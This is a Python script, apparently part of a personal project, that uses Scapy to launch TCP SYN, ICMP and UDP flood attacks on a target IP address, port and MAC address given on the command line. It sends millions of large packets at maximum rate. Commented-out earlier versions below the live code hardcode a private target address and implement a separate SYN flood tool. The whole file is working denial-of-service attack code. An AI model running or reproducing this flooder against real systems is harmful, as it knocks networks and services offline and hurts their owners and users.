"""
Description:
    This script performs various types of flood attacks (TCP, ICMP, UDP) on a specified target.
    It constructs and sends specific packets based on command-line arguments.

Maintainer:    
            ::::  ::::::::::::  
            :+:     :+:    :+: 
            +:+     +:+    +:+ 
            +#+     +#+    +:+ 
            +#+     +#+    +#+ 
        #+# #+#     #+#    #+# 
         #####    ############     

Date:
    Oct 07, 2023

Usage:
    python3 script_name.py [ip] [port] [mac]

Arguments:
    ip - Target IP address for the flood attack
    port - Target port for the flood attack
    mac - Target's MAC address

Dependencies:
    - Scapy

Notes:
    For proper functionality, the script may need to be run with superuser (root) privileges. In project I use wrapper.c file /be.
"""

from scapy.all import *
from scapy.layers.inet import IP, TCP, ICMP, UDP
from scapy.layers.l2 import Ether
from scapy.volatile import RandShort
import argparse

# define arguments for IP, Port and MAC address
parser = argparse.ArgumentParser(description="Flood Tool")
parser.add_argument("ip", help="Target IP address")
parser.add_argument("port", type=int, help="Target Port")
parser.add_argument("mac", help="Target MAC address")
args = parser.parse_args()

# set target IP, Port and MAC addresses from command line arguments
target_ip = args.ip
target_port = int(args.port)
target_mac = args.mac
packets_to_send = 10000000
packet_size = 1450

# create IP layer
iplayer = IP(dst=target_ip, id=1111, ttl=99)

# create TCP layer
tcplayer = TCP(sport=RandShort(), dport=target_port,
               seq=12345, ack=1000, window=1000, flags="S")

# create ICMP layer
icmp_layer = ICMP()

# create UDP layer
udplayer = UDP(sport=RandShort(), dport=target_port)

# packet data size
data = Raw(b"X" * packet_size)

# create and send TCP packets
tcp_packet = Ether(dst=target_mac) / iplayer / tcplayer / data
sendpfast(tcp_packet, mbps=1000000, pps=1000000, loop=packets_to_send,
          iface="en0")

# create and send ICMP packets
#icmp_packet = Ether(dst=target_mac) / iplayer / icmp_layer / data
#sendpfast(icmp_packet, mbps=1000000, pps=1000000, loop=packets_to_send,
#          iface="en0")

# create and send UDP packets
#udp_packet = Ether(dst=target_mac) / iplayer / udplayer / data
#sendpfast(udp_packet, mbps=1000000, pps=1000000, loop=packets_to_send,
#          iface="en0")




















# from scapy.all import *
# from scapy.layers.inet import IP, TCP, ICMP, UDP
# from scapy.layers.l2 import Ether
# from scapy.volatile import RandShort

# target_ip = "10.0.0.118"
# target_port = 80
# packets_to_send = 10000000
# packet_size = 1450
# target_mac = "3c:91:80:45:38:bb"

# # ip layer
# iplayer = IP(dst=target_ip, id=1111, ttl=99)

# # tcp layer
# tcplayer = TCP(sport=RandShort(), dport=target_port,
#                seq=12345, ack=1000, window=1000, flags="S")

# # icmp layer
# icmp_layer = ICMP()

# # udp layer
# udplayer = UDP(sport=RandShort(), dport=target_port)

# # packet data size
# data = Raw(b"X" * packet_size)

# # create packets
# tcp_packet = Ether(dst=target_mac) / iplayer / tcplayer / data
# icmp_packet = Ether(dst=target_mac) / iplayer / icmp_layer / data
# udp_packet = Ether(dst=target_mac) / iplayer / udplayer / data

# # send tcp packets
# sendpfast(tcp_packet, mbps=1000000, pps=1000000, loop=packets_to_send,
#           iface="en0")  # odesílání TCP paketů

# # send icmp packets
# sendpfast(icmp_packet, mbps=1000000, pps=1000000, loop=packets_to_send,
#           iface="en0")  # odesílání ICMP paketů

# # send udp packets
# sendpfast(udp_packet, mbps=1000000, pps=1000000, loop=packets_to_send,
#           iface="en0")


# 1 mbps=100000 pps=100000 // max 5.895
# 1 mbps=100000 pps=100000 // max 7069.761


# #!/usr/bin/env python
# # with scapy lets create two packets, first for SYN flood, second for ICMP flood

# from scapy.all import *
# import json

# from scapy.layers.inet import IP, TCP
# from scapy.packet import Raw
# from scapy.sendrecv import send
# from scapy.volatile import RandShort
# import argparse


# def syn(target_ip: str, target_port: int, packets_to_send: int, packet_size: int):
#     ip = IP(dst=target_ip)
#     tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
#     raw = Raw(b"X" * packet_size)
#     packet = ip / tcp / raw

#    # Sending packets using send() function
#     sent_count, _ = send([packet]*packets_to_send,
#                          verbose=0, return_packets=True)

#     # Create a dictionary with the results
#     result = {
#         'total_packets': packets_to_send,
#         'successfully_sent': sent_count
#     }

#     # Convert dictionary to JSON and print it
#     print(json.dumps(result))


# if __name__ == "__main__":
#     parser = argparse.ArgumentParser(description="SYN flood tool")
#     parser.add_argument("-target_ip", required=True, help="target ip")
#     parser.add_argument("-dport", type=int, default=80,
#                         help="target port for SYN flood")
#     parser.add_argument("-packets", type=int, default=1,
#                         help="packets to send")
#     parser.add_argument("-packet_size", type=int,
#                         default=100, help="packets size")
#     args = parser.parse_args()
#     syn(args.target_ip, args.dport, args.packets, args.packet_size)
